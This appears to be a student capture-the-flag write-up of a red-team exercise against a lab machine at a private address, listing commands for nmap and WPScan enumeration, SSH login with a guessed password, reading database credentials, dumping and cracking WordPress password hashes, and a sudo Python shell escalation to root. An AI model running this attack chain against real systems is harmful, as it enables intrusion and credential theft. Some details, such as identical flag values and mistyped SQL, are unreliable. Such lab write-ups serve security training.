# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

---

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```
$ nmap 192.168.1.110
```
![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/1-nmap.png)

This scan identifies the services below as potential points of entry:

**Target 1**
```
- Port 22/TCP   Open SSH
- Port 80/TCP   Open HTTP
- Port 111/TCP 	Open rcpbind
- Port 139/TCP 	Open netbios-ssn
- Port 445/TCP 	Open netbios-ssn
```

The following vulnerabilities were identified on each target:
**Target 1**
```
- Weak User Password
- WordPress - user enumeration and unsalted user password hash
- Escalation of privilege
```

---

### Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33e11b80be759c4e844862482d**
- Exploit Used:
    - WPScan to identify users of the Target 1 machine
    - Command: `$ wpscan --url http://192.168.1.110/wordpress`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/wp1.png)

    - Command: `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/wpu.png)

- Accessing user Michael
    - due to a weak password we were able to guess Michael's password
    - `ssh michael@192.168.1.110`
    - Password: `michael`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/SSH.png)

- Accessing var/www/html as root and using `grep` to capture flag1.
    - Commands:
        - `cd ../`
        - `cd var/www`
        - `cd html/`
        - `ls`
        - `grep -IR flag1 *`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/flag1.png)

- **Flag2: fc3fd58dcdad9ab23faca6e9a36e5**
- Exploit Used:
    - Same exploit used to capture flag1.
        - Commands:
            - `cd ../`
            - `ls`
            - `cat flag2.txt`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/flag2.png)

- **Flag3: fc3fd58dcdad9ab23faca6e9a36e5**
- Exploit Used:
    - Same exploit used to capture flag1 and flag2.
    - Once `wp-config.php` was found, we gained access to the database (as Michael) MySQL was used to locate flag3.
        - Commands:
            - `mysql -u root -pR@v3nSecurity`
            - `connect wordpress`
            - `show tables`
            - `seletct * from wp_posts;`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/sp_post.png)

- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Recieve 'hash' password for both Michael and Steven byb using the same MySQL exploit from flag3.
        - Commands:
            - `mysql -u root -pR@v3nSecurity`
            - `connect wordpress`
            - `show tables`
            - `seletct * from wp_users;`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/tables.png)

   - Created a .txt file of 'hash' passwords
    - `nano wp_hash.txt`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/wphash.png)    

- Used John the Ripper to unhash Steven's password
    - `john wp_hash.txt`
    - `john --show wp_hash.txt`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/password.png)

- Accessing user Steven
    - `ssh steven@192.168.1.110`
    - Password: `pink84`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/sshsteven.png)

- Use Python to gain root privileges
    - `ls`
    - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
    - `cd ~`
    - `ls`
    - `cat flag4.txt`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/Python.png)
